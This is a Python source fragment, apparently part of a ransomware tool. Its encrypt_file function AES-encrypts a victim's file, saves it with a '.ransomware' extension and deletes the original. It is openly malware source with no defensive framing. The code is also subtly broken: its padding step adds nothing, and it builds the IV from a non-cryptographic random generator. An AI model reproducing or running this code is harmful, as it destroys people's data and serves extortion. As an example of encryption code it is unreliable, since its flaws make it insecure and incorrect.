from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from random import randint
import os

def encrypt_file(key,filename):
	chunksize=65536
	direx,ext=os.path.splitext(filename)
	ext += ' '* (16- (len(ext) % 16))
	outputfile=direx+'.ransomware'
	filesize=str(os.path.getsize(filename)).zfill(16)
	IV=''

	for i in range(16):
		IV +=chr(randint(0,255))

	encryptor=AES.new(key, AES.MODE_CBC, IV)
	
	with open(filename,'rb') as infile:
		with open(outputfile,'wb') as outfile:
			outfile.write(ext)
			outfile.write(filesize)
			outfile.write(IV)

			while True:
				chunk=infile.read(chunksize)
				if len(chunk)==0:
					break
				elif len(chunk) % 16 != 0:
					chunk += ''* (16-(len(chunk)) % 16)
				outfile.write(encryptor.encrypt(chunk))
	os.unlink(filename)
	return
